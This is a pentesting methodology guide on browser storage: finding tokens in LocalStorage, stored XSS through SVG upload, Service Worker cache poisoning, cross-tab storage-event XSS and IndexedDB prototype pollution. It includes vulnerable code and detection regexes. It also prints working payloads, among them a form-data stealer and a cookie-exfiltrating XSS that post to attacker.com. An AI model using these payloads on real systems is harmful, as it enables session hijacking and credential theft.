# Browser Storage

## Check List

## Methodology

### Black Box

#### Browser Storage Exposure

{% stepper %}
{% step %}
During initial analysis, open the target application and inspect browser storage. Use Developer Tools → Application / `Storage` → `LocalStorage` and `SessionStorage`
{% endstep %}

{% step %}
Look for key–value pairs that may store authentication details, API tokens, user profiles, or logs containing user activity
{% endstep %}

{% step %}
Expand JSON objects, arrays, or nested values to identify whether the application stores secrets such as usernames, passwords, session identifiers, or personal data inside `LocalStorage` or `SessionStorage`. Since browser storage is fully accessible to client-side JavaScript, any sensitive data stored there is at risk if an `XSS` vulnerability exists
{% endstep %}

{% step %}
Verify persistence across sessions: Log out, clear browser data, or use an incognito profile. Then log in again and re-check `LocalStorage`/`SessionStorage` to determine whether sensitive values are consistently stored upon authentication. Confirm that the behavior occurs for any authenticated user, not just a specific test account
{% endstep %}

{% step %}
Determine whether the stored data includes credentials or other sensitive fields. Consider how an attacker with JavaScript execution (via `XSS`) could potentially access and extract this information, as `LocalStorage` has no `HttpOnly` protection mechanism
{% endstep %}

{% step %}
Show that sensitive data saved in `LocalStorage` can be read by any script running on the same origin (via the browser console). Highlight that storing sensitive secrets in `LocalStorage` exposes users to credential compromise if a cross-site scripting vulnerability is ever introduced
{% endstep %}
{% endstepper %}

***

#### Discovering Authentication Token Stored in LocalStorage

{% stepper %}
{% step %}
Start by signing into the target application normally. You need an authenticated session so that any tokens created by the Frontend become visible in the browser storage panel
{% endstep %}

{% step %}
Open Developer Tools → Application → Local Storage. Then look at the stored keys (a large JSON object under a single key like User)
{% endstep %}

{% step %}
Copy the entire value of the `LocalStorage` entry and paste it into a text editor. Search for sensitive fields such as&#x20;

```http
- token
- auth_token
- accessToken
- bearer
- session
```
{% endstep %}

{% step %}
Copy the token value exactly as-is like

```http
1affabacb13d3f1041d913341a37c05112c7428
```

This token is readable by any script running in the page, meaning any XSS or malicious browser extension could steal it
{% endstep %}

{% step %}
Open Burp Suite and prepare a request: To confirm whether this token actually functions as an authentication credential, you should send a normal API request using Burp Suite. Target an authenticated endpoint, for example

```http
GET https://target.com/api/v1/me HTTP/1.1
```
{% endstep %}

{% step %}
Add the header

```http
Authorization: Bearer <token>
```
{% endstep %}

{% step %}
Replace \<token> with the value extracted from localStorage. The sample request might look like this:

```http
GET /prefs/v1/account/connected_accounts_info?success_page=%2Fapp%2Fsettings%2Faccount HTTP/2
Host: app.target.com
Sec-Ch-Ua: “Chromium”;v=”127", “Not)A;Brand”;v=”99"
Doist-Platform: web
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer 1affabacb13d3f1041d913341a37c05112c7428
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Doist-Version: 9173
Doist-Screen: 1920x1032
Content-Type: application/json
Doist-Os: Windows
Doist-Locale: en
Sec-Ch-Ua-Platform: “Windows”
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.target.com/app/settings/account
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```
{% endstep %}

{% step %}
Observe the response. The server might return valid user information, confirming
{% endstep %}
{% endstepper %}

***

#### Stored XSS via SVG Upload Leading to LocalStorage Token Theft

{% stepper %}
{% step %}
Begin by identifying an upload/import feature in the application. In this case, the target allowed importing document files such as `.csv` or `.docx,` When opening the file selection dialog, the OS might show the filter “All Supported Types”, restricting uploads to document formats
{% endstep %}

{% step %}
Change the file type filter to “All Files” and attempt to upload an unsupported file format. By switching the filter to All Files, it becomes possible to upload an `.svg` file containing an embedded XSS payload inside an XML `<script>` tag
{% endstep %}

{% step %}
Upload the malicious `.svg` file and intercept the request in Burp Suite. The first upload might succeed silently without revealing where the file was stored. On the second attempt, intercept the request and enable Proxy → Intercept → Response to this request. This reveals the server’s response containing the file’s upload path
{% endstep %}

{% step %}
Visit the discovered file path in the browser. Navigating to the uploaded `.svg` file may trigger execution of the JavaScript payload, confirming stored (persistent) XSS within the application
{% endstep %}

{% step %}
Analyze the application’s authentication flow. Upon login, the application might generate a unique authentication token. This token is stored inside LocalStorage, and is also used as a CSRF protection token. Since LocalStorage is readable via JavaScript, any stored XSS can access values saved there
{% endstep %}

{% step %}
Modify the SVG payload to extract the LocalStorage token. Add an additional line inside the tag to read the `<script>` LocalStorage item, for example

Replace `<item-name>` with the actual key used by the application (IsvSessionToken)
{% endstep %}

{% step %}
Re-upload the modified SVG and access the stored file again. When visiting the stored file path, the SVG executes JavaScript in the browser context of the domain. The payload successfully retrieves the token stored in LocalStorage and displays it

```javascript
alert(localStorage.getItem("IsvSessionToken"));
```
{% endstep %}

{% step %}
This confirms that the attacker can extract sensitive authentication data directly from LocalStorage through stored XSS, Payload Example like

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full"
     xmlns="http://www.w3.org/2000/svg">

<polygon id="triangle" points="0,0 0,50 50,0"
         fill="#009900" stroke="#004400"/>

<script type="text/javascript">
prompt('XSS-Attack');
prompt(document.domain);
prompt(document.cookie);
alert(localStorage.getItem("IsvSessionToken"));
</script>

</svg>
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Persistent Execution Hijacking via Global Cache API Poisoning in Progressive Web Apps (PWAs)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite and browser Developer Tools. Focus on Progressive Web Apps (PWAs) or applications boasting offline capabilities, which rely on Service Workers to intercept network requests
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the Service Worker script (typically `sw.js` or `service-worker.js`) and the application's caching strategy (e.g., Cache-First, Network-First, Stale-While-Revalidate)
{% endstep %}

{% step %}
Identify the "Offline Availability" architecture. To ensure the SPA loads instantly and operates offline, the Service Worker intercepts HTTP `GET` requests for core assets (e.g., `/static/js/main.bundle.js`, `/api/v1/config`) and serves them directly from the browser's native `CacheStorage` API
{% endstep %}

{% step %}
Investigate the execution boundaries of the `CacheStorage` API. Modern web architectures assume that because the Service Worker operates in an isolated background thread, its cache repository is similarly isolated
{% endstep %}

{% step %}
Discover the fatal boundary collapse: The `CacheStorage` API is completely global to the origin. It is accessible not only to the isolated Service Worker but also directly exposed to the main `window` execution context via `window.caches`
{% endstep %}

{% step %}
Understand the Persistence vulnerability: If an attacker can execute a transient, highly restricted Cross-Site Scripting (XSS) payload—even a self-XSS or a payload isolated to a low-value sub-directory (e.g., `[https://app.enterprise.tld/sandbox/preview.html](https://app.enterprise.tld/sandbox/preview.html)`)—they can utilize the global `window.caches` object to actively manipulate the Service Worker's storage layer
{% endstep %}

{% step %}
Formulate the Cache Poisoning payload. The attacker does not need to compromise the backend or bypass the Content Security Policy (CSP) for external scripts. They only need to overwrite an existing, trusted first-party JavaScript file residing in the cache
{% endstep %}

{% step %}
Construct the payload. Use the `caches.open()` method to access the specific cache namespace (e.g., `workbox-precache-v2`)
{% endstep %}

{% step %}
Generate a synthetic HTTP Response object containing the malicious JavaScript payload (e.g., intercepting keystrokes or exfiltrating tokens)
{% endstep %}

{% step %}
Execute `cache.put('/static/js/main.bundle.js', new Response('...malicious JS...', { headers: { 'Content-Type': 'application/javascript' } }))`
{% endstep %}

{% step %}
The victim triggers the initial, transient XSS. The attacker's script executes and silently overwrites the cached core application bundle
{% endstep %}

{% step %}
The victim navigates to the primary dashboard or refreshes the page
{% endstep %}

{% step %}
The Service Worker intercepts the browser's request for `/static/js/main.bundle.js`. Operating exactly as designed (Cache-First strategy), the Service Worker retrieves the attacker's poisoned payload from the Cache API and delivers it to the DOM
{% endstep %}

{% step %}
The browser executes the payload. The attacker has successfully converted a transient, low-impact XSS into a permanent, highly resilient architectural backdoor that survives page reloads, network reconnects, and session terminations, persisting until the user physically clears their browser site data

**VSCode Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
caches\.open\(['"][a-zA-Z0-9_-]+['"]\)|cache\.put\(.*new\s+Response|navigator\.serviceWorker\.register|event\.respondWith\(caches\.match
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
caches\.open\(['"][a-zA-Z0-9_-]+['"]\)|cache\.put\(.*new\s+Response|navigator\.serviceWorker\.register|event\.respondWith\(caches\.match
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
const CACHE_NAME = 'enterprise-app-v1';

// [1]
// [2]
// Service Worker intercepts all network requests to provide offline support
self.addEventListener('fetch', (event) => {
    if (event.request.method !== 'GET') return;

    event.respondWith(
        caches.match(event.request).then((cachedResponse) => {
            // [3]
            // [4]
            // Fatal Trust: The Service Worker inherently trusts the contents of the Cache API.
            // If the global window.caches object was poisoned by a transient script, 
            // the Service Worker blindly serves the malicious payload as a first-party asset.
            if (cachedResponse) {
                return cachedResponse; 
            }
            return fetch(event.request).then((networkResponse) => {
                return caches.open(CACHE_NAME).then((cache) => {
                    cache.put(event.request, networkResponse.clone());
                    return networkResponse;
                });
            });
        })
    );
});
```

```html
<!-- Hosted on a low-privilege path, e.g., /sandbox/render.html -->
<script>
    // A seemingly low-impact DOM XSS flaw in a peripheral feature
    const urlParams = new URLSearchParams(window.location.search);
    document.body.innerHTML = urlParams.get('custom_title'); // Transient XSS
</script>
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture incorporates Progressive Web App (PWA) features to ensure high performance and offline availability, utilizing Service Workers as localized network proxies, \[2] The Service Worker employs a Cache-First routing strategy, explicitly bypassing the network to deliver assets instantly from the browser's Cache Storage, \[3] The security model assumes that Service Worker caches are hermetically sealed repositories maintained exclusively by the background worker thread, \[4] The execution paradox. The W3C specification dictates that the `CacheStorage` API is exposed globally to the `window` object of the origin. By discovering a minor, isolated XSS vulnerability anywhere on the origin, the attacker leverages the global `window.caches` interface to rewrite the core JavaScript assets. The Service Worker, oblivious to the fact that the cache was modified out-of-band by the main thread, faithfully serves the poisoned files. This transforms a temporary script execution into an un-killable, persistent browser backdoor&#x20;

```javascript
// 1. Attacker executes a transient DOM XSS via a vulnerable URL parameter on the target origin.
// https://app.enterprise.tld/help?query=<script src="https://evil.com/poison.js"></script>

// 2. The attacker's script (poison.js) enumerates the active browser caches.
window.caches.keys().then(function(cacheNames) {
    cacheNames.forEach(function(cacheName) {
        
        window.caches.open(cacheName).then(function(cache) {
            
            // 3. The attacker locates the core application bundle URL.
            const targetAsset = '/static/js/main.bundle.js';
            
            // 4. The attacker synthesizes a completely new HTTP Response object.
            // They embed their persistent malware, followed by fetching the actual code 
            // to ensure the application continues to function invisibly.
            const maliciousCode = `
                /* --- INJECTED MALWARE --- */
                window.addEventListener('submit', (e) => {
                    const data = new FormData(e.target);
                    fetch('https://attacker.com/leak', { method: 'POST', body: data });
                });
                /* --- END MALWARE --- */
                console.log("App initialized.");
            `;

            const poisonedResponse = new Response(maliciousCode, {
                status: 200,
                statusText: 'OK',
                headers: new Headers({
                    'Content-Type': 'application/javascript',
                    'Cache-Control': 'max-age=31536000'
                })
            });

            // 5. The attacker forcefully overwrites the cache entry.
            cache.put(targetAsset, poisonedResponse).then(() => {
                console.log("Cache poisoned successfully.");
            });
        });
    });
});

// 6. The victim navigates back to the main dashboard. 
// 7. The Service Worker intercepts the request for main.bundle.js, retrieves the poisoned 
//    response from the Cache API, and executes the attacker's keylogger.
```
{% endstep %}

{% step %}
To eliminate network latency and support offline execution, platform architects integrated Service Workers backed by the Cache Storage API. This optimization transferred critical application routing and asset delivery logic directly to the client's browser. The architectural blind spot emerged from a misunderstanding of origin-wide storage permissions. Developers assumed that the Cache API was an isolated enclave exclusively controlled by the background Service Worker thread. However, standard browser specifications globally expose the `window.caches` interface to any script executing on the origin. By exploiting an isolated, low-severity XSS vector on a peripheral page, the attacker bypassed the backend infrastructure entirely. They manipulated the shared client-side storage, physically replacing the trusted application binaries within the cache. The Service Worker unwittingly distributed these poisoned binaries upon subsequent navigation, elevating a transient exploit into a permanent, highly evasive client-side persistence mechanism
{% endstep %}
{% endstepper %}

***

#### Cross-Tab Context Bleeding via Asynchronous storage Event Deserialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on multi-window enterprise dashboards, trading terminals, or complex SPAs that synchronize user state (e.g., UI themes, shopping carts, session logouts) across multiple browser tabs concurrently
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the frontend state synchronization module
{% endstep %}

{% step %}
Identify the "Multi-Tab Synchronization" architecture. When a user updates their preference in Tab A, the application immediately updates Tab B without requiring a page refresh. This is accomplished using the HTML5 `LocalStorage` API and listening for the globally broadcasted `storage` event (`window.addEventListener('storage', ...)`)
{% endstep %}

{% step %}
Investigate the payload evaluation layer. When the `storage` event fires, the browser provides the `key`, the `oldValue`, and the `newValue`. The frontend code parses the `newValue` (typically using `JSON.parse()`) and merges the resulting object directly into the active application state (e.g., a Vuex store, Redux slice, or Angular service)
{% endstep %}

{% step %}
Analyze the Execution Context. To seamlessly update the UI, the frontend relies on reactive data bindings. If the synced state contains UI directives (like a custom error message or a localized theme template), it is often piped directly into a DOM sink (e.g., `v-html`, `dangerouslySetInnerHTML`, or an innerHTML assignment)
{% endstep %}

{% step %}
Discover the fatal trust assumption: Developers assume that `LocalStorage` is a sealed, trusted repository because it is strictly bound by the Same-Origin Policy (SOP). They implicitly trust the contents of the `storage` event because they assume the data was written by their own secure application logic
{% endstep %}

{% step %}
Understand the architectural bypass: While `LocalStorage` is restricted to the origin, it is shared across _all_ paths and sub-directories of that origin. If the enterprise hosts a legacy endpoint, a file upload viewer, or a sandboxed environment on the same root domain (e.g., `[https://enterprise.com/sandbox/](https://enterprise.com/sandbox/)`), an attacker can execute a low-privilege script there
{% endstep %}

{% step %}
Formulate the Cross-Tab Escalation payload. Identify the exact JSON structure the primary application expects when handling the `storage` event
{% endstep %}

{% step %}
Construct a malicious JSON payload that targets a reactive DOM sink in the primary application. (e.g., `{"themeHtml": "<img src=x onerror=alert(document.domain)>"}`)
{% endstep %}

{% step %}
Lure the victim to the low-privilege endpoint on the same origin (e.g., `[https://enterprise.com/sandbox/preview.html](https://enterprise.com/sandbox/preview.html)`)
{% endstep %}

{% step %}
Execute the exploit within the sandbox context: `localStorage.setItem('user_preferences', '{"themeHtml": "<img src=x onerror=alert(1)>"}');`
{% endstep %}

{% step %}
The browser detects the `LocalStorage` mutation and instantly broadcasts the `storage` event to all other open tabs on the origin
{% endstep %}

{% step %}
The victim's highly privileged, authenticated tab (e.g., `[https://enterprise.com/admin/dashboard](https://enterprise.com/admin/dashboard)`) intercepts the event
{% endstep %}

{% step %}
Relying on implicit trust in origin-bound storage, the Admin dashboard parses the attacker's JSON, applies it to the reactive state, and blindly renders the malicious HTML. The attacker effortlessly bridges the execution gap between a sandboxed/low-privilege tab and the highly classified administrative tab

**VSCode Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
window\.addEventListener\(['"]storage['"],\s*\(?e\)?\s*=>|JSON\.parse\(e\.newValue\)|localStorage\.setItem\(.*,\s*JSON\.stringify|v-html="\$store\.state|dangerouslySetInnerHTML=\{\{\s*__html:\s*state\.
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
window\.addEventListener\(['"]storage['"],\s*\(?e\)?\s*=>|JSON\.parse\(e\.newValue\)|localStorage\.setItem\(.*,\s*JSON\.stringify|v-html="\$store\.state|dangerouslySetInnerHTML=\{\{\s*__html:\s*state\.
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
// [1]
// [2]
// Cross-tab synchronization listener established on application boot
window.addEventListener('storage', (event) => {
    if (event.key === 'app_ui_preferences') {
        try {
            // [3]
            // [4]
            // The developer assumes the newValue was generated safely by the application.
            // The payload is parsed and pushed directly into the global reactive state store.
            const newPreferences = JSON.parse(event.newValue);
            store.commit('UPDATE_UI_PREFS', newPreferences);
        } catch (e) {
            console.error("State sync failed.");
        }
    }
});

// Inside the Vue Component (Dashboard.vue):
// <template>
//   <div class="dashboard-container">
//     <!-- The reactive state triggers a DOM update, executing the attacker's HTML -->
//     <div class="custom-header" v-html="$store.state.uiPreferences.customHeader"></div>
//   </div>
// </template>
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture enforces seamless user experiences by synchronizing state mutations (e.g., shopping cart updates, theme toggles) across multiple concurrent browser tabs, \[2] To achieve this without repetitive API polling, developers rely on the native `storage` event broadcasted by the browser whenever `LocalStorage` is mutated, \[3] The architecture equates the Same-Origin Policy (SOP) with absolute data integrity. Because `LocalStorage` cannot be written to by external domains, developers treat its contents as safely sanitized, first-party data, \[4] The execution sink. The developers failed to recognize that the SOP applies to the entire origin domain, bridging paths of vastly different privilege levels (e.g., `/sandbox` vs `/admin`). By discovering an injection vector on a low-privilege path, the attacker overwrites the shared `LocalStorage` key. The browser's native event emitter blindly transmits this poisoned state to the highly privileged administrative tab. The administrative tab, relying on implicit trust, parses the payload and drops it directly into a reactive DOM sink. This architectural oversight transforms local browser storage into a high-speed, cross-context Remote Procedure Call (RPC) exploit vector

```javascript
// 1. Attacker identifies a low-impact HTML injection on an isolated path of the target origin.
// Example: https://enterprise.com/sandbox/preview?content=...

// 2. Attacker crafts a URL that writes a malicious payload to LocalStorage when executed 
// inside the sandbox context.
const exploitUrl = `https://enterprise.com/sandbox/preview?content=` + encodeURIComponent(`
    <script>
        // 3. The script overwrites the primary application's configuration key.
        const maliciousConfig = {
            customHeader: "<img src=x onerror=\"fetch('https://attacker.com/leak?d=' + btoa(document.cookie))\">",
            themeMode: "dark"
        };
        localStorage.setItem('app_ui_preferences', JSON.stringify(maliciousConfig));
        console.log("Storage poisoned.");
    </script>
`);

// 4. The attacker sends the link to the Enterprise Administrator.
// 5. The Administrator (who already has an active tab open at https://enterprise.com/admin/dashboard)
//    clicks the link, opening the sandbox in a secondary tab.
// 6. The sandbox tab executes the script and mutates LocalStorage.
// 7. The browser fires the 'storage' event across all tabs.
// 8. The Administrator's active dashboard tab receives the event.
// 9. The dashboard tab executes `JSON.parse(e.newValue)` and assigns it to the reactive state.
// 10. Vue/React immediately renders the new `customHeader` via `v-html` / `dangerouslySetInnerHTML`.
// 11. The XSS payload executes securely within the context of the Admin dashboard, exfiltrating the session.
```
{% endstep %}

{% step %}
To support complex, multi-window user workflows, frontend engineers deployed real-time state synchronization mechanisms leveraging the browser's native `storage` event. This optimization eliminated backend polling by utilizing `LocalStorage` as a localized message broker. The security flaw materialized from a monolithic interpretation of origin trust. Developers assumed that data residing within `LocalStorage` was inherently safe, having been previously validated by the application's core logic. They failed to account for intra-origin privilege differentials, where peripheral or legacy application paths share the exact same storage context as highly classified administrative interfaces. The attacker subverted this architecture by executing a localized write operation within a low-privilege sandbox. The browser faithfully broadcasted this poisoned memory state to all concurrent tabs. The primary administrative tab, completely bypassing its own initialization safeguards, eagerly ingested and rendered the synchronized payload. This temporal manipulation bridged isolated execution contexts, successfully executing DOM XSS via client-side state poisoning
{% endstep %}
{% endstepper %}

***

#### Prototype Pollution via IndexedDB Structured Clone Algorithm Deserialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on data-intensive applications (e.g., offline-first CRM platforms, browser-based IDEs, or web-based email clients) that store massive datasets asynchronously using `IndexedDB` or wrapping libraries like `localForage` / `Dexie.js`
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the frontend data hydration sequence
{% endstep %}

{% step %}
Identify the "Offline Hydration" architecture. When the application boots, fetching megabytes of configuration data from the backend is too slow. The application immediately pulls the cached user configuration from `IndexedDB`
{% endstep %}

{% step %}
Investigate the State Merging logic. Applications frequently update their internal schemas. To ensure backward compatibility with older cached configurations stored in `IndexedDB`, developers employ a "Deep Merge" algorithm. The frontend deeply merges the cached `IndexedDB` object into a pristine, default state object (e.g., `appState = deepMerge(defaultConfig, indexedDbData)`)
{% endstep %}

{% step %}
Analyze the IndexedDB serialization format. Unlike `LocalStorage` which strictly stores strings, `IndexedDB` uses the Structured Clone Algorithm. This algorithm natively stores and retrieves complex JavaScript objects, Maps, Sets, and Arrays
{% endstep %}

{% step %}
Discover the fatal prototype protection bypass: Modern applications heavily sanitize API responses for Prototype Pollution (e.g., stripping `__proto__` during JSON parsing). However, developers explicitly trust `IndexedDB` because it represents "internal" storage. They execute deep merges on `IndexedDB` payloads without utilizing safe merging libraries (like `lodash.merge` with prototype protection)
{% endstep %}

{% step %}
Understand the Storage Manipulation vulnerability: If an attacker can inject an arbitrary JSON string into a peripheral API endpoint (e.g., saving a custom widget layout), the backend API saves it. When the frontend syncs, it writes the raw object to `IndexedDB`
{% endstep %}

{% step %}
Formulate the Prototype Pollution payload. Construct a JSON object containing the `__proto__` key
{% endstep %}

{% step %}
Target a feature that synchronizes remote API data into local IndexedDB storage (e.g., User Preferences synchronization)
{% endstep %}

{% step %}
Inject the payload: `{"theme": "dark", "__proto__": {"isAdmin": true, "v-if": "true"}}`
{% endstep %}

{% step %}
The backend stores the JSON. The frontend fetches the JSON. Because `JSON.parse` translates the string perfectly into an object containing a `__proto__` property (if parsed generically before DB insertion), it is saved into `IndexedDB`
{% endstep %}

{% step %}
The user refreshes the page. The application boots
{% endstep %}

{% step %}
The application reads the configuration object from `IndexedDB`
{% endstep %}

{% step %}
The application executes the vulnerable `deepMerge(defaultState, cachedConfig)`
{% endstep %}

{% step %}
The deep merge algorithm iterates over the keys of the cached configuration. It encounters `__proto__`. It navigates up the prototype chain of the `defaultState` object and forcefully assigns the attacker's properties (`isAdmin = true`) directly onto the global `Object.prototype`
{% endstep %}

{% step %}
Every subsequent object created in the application inherits these poisoned properties, enabling the attacker to bypass client-side authorization checks or achieve DOM XSS by polluting rendering gadgets

**VSCode Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
function\s+deepMerge\s*\(.*?\)|db\.transaction\(['"][a-zA-Z0-9_-]+['"]\).*?\.get\(|\.getItem\(['"][a-zA-Z0-9_-]+['"]\)\.then\(.*?merge|Object\.assignDeep
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
function\s+deepMerge\s*\(.*?\)|db\.transaction\(['"][a-zA-Z0-9_-]+['"]\).*?\.get\(|\.getItem\(['"][a-zA-Z0-9_-]+['"]\)\.then\(.*?merge|Object\.assignDeep
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
import localforage from 'localforage';

// [1]
// [2]
// Custom, unsafe deep merge function commonly found in utility files
function deepMerge(target, source) {
    for (const key in source) {
        // [3]
        // [4]
        // Fatal Flaw: The developer does not check if key === '__proto__' or 'constructor'.
        // It blindly navigates the prototype chain and assigns the value.
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

const DEFAULT_CONFIG = {
    theme: 'light',
    features: { beta: false }
};

async function initializeApp() {
    // Retrieves complex object stored via Structured Clone Algorithm
    const cachedData = await localforage.getItem('user_config');

    // Evaluates IndexedDB data as completely trusted
    if (cachedData) {
        // Triggers Prototype Pollution
        window.APP_STATE = deepMerge(DEFAULT_CONFIG, cachedData);
    } else {
        window.APP_STATE = DEFAULT_CONFIG;
    }

    renderUI();
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture mandates offline availability and rapid bootstrapping, utilizing `IndexedDB` to cache complex, structured application state locally, \[2] To reconcile older cached data schemas with new application updates, developers implement recursive deep merging functions during the hydration phase, \[3] The architecture relies entirely on the perimeter defenses (e.g., API sanitization) to prevent Prototype Pollution, assuming any data safely persisted to `IndexedDB` is structurally benign, \[4] The execution sink. The developers utilized an unsafe, custom recursive merge algorithm that fails to filter prototype traversing keys (`__proto__`, `constructor`, `prototype`). By discovering a secondary injection point that synchronizes unstructured JSON data into the client's `IndexedDB` (like saving a custom dashboard layout), the attacker plants a dormant object containing a `__proto__` payload. Upon the next application boot, the frontend retrieves the object and passes it to the `deepMerge` routine. The algorithm inadvertently steps out of the local object scope and pollutes the global `Object.prototype`. This fundamental corruption of the JavaScript runtime grants the attacker absolute control over all uninitialized properties across the entire application, enabling catastrophic logic bypasses and DOM XSS

```http
// 1. Attacker identifies an API endpoint that synchronizes user settings to IndexedDB.
// The backend stores the JSON string without deep validation.

POST /api/v1/settings/sync HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json

{
  "layout": "grid",
  "__proto__": {
    "isSuperAdmin": true,
    "dangerouslySetInnerHTML": "<img src=x onerror=alert('DOM_XSS')>"
  }
}

// 2. The victim logs into the application.
// 3. The frontend fetches the settings from the API and saves the object to IndexedDB.
//    localforage.setItem('user_config', apiResponse.data);

// 4. The victim refreshes the page (or closes and reopens the app).
// 5. The application boots and executes the hydration sequence.
//    const cachedData = await localforage.getItem('user_config');
//    window.APP_STATE = deepMerge(DEFAULT_CONFIG, cachedData);

// 6. The deepMerge function executes: target['__proto__']['isSuperAdmin'] = true;
// 7. This mutates the global Object.prototype.

// 8. Later in the application execution, a routing guard checks privileges:
//    const userPermissions = {}; 
//    if (userPermissions.isSuperAdmin) { loadAdminPanel(); }
//    // userPermissions.isSuperAdmin is undefined, so JS checks the prototype chain.
//    // It finds true. The routing guard is bypassed.

// 9. A React component attempts to render a safe span, but forgets to initialize a property:
//    const props = { className: "safe-text" };
//    // React internally checks props.dangerouslySetInnerHTML. 
//    // Because it is polluted on the prototype, React executes the XSS payload.
```
{% endstep %}

{% step %}
To guarantee lightning-fast application initialization and robust offline capabilities, architects designed asynchronous state hydration pipelines leveraging `IndexedDB`. This design required recursive deep merging to continuously reconcile cached local state with evolving application schemas. The systemic security failure arose from placing unconditional trust in data retrieved from local browser APIs. Developers assumed that because `IndexedDB` was separated from direct network input by the application's internal sync logic, it was immune to structural manipulation. Consequently, they deployed unsafe, custom deep merge utilities lacking prototype protection. The attacker exploited an upstream data synchronization endpoint to embed a weaponized JSON structure containing prototype keys. The application faithfully cached this structure. During the subsequent boot sequence, the frontend retrieved the payload and blindly merged it. This action transcended local variable assignment, irrevocably corrupting the global `Object.prototype` matrix. The attacker successfully escalated a dormant data injection into a ubiquitous runtime exploit, globally bypassing authorization checks and detonating DOM XSS sinks throughout the application lifecycle
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
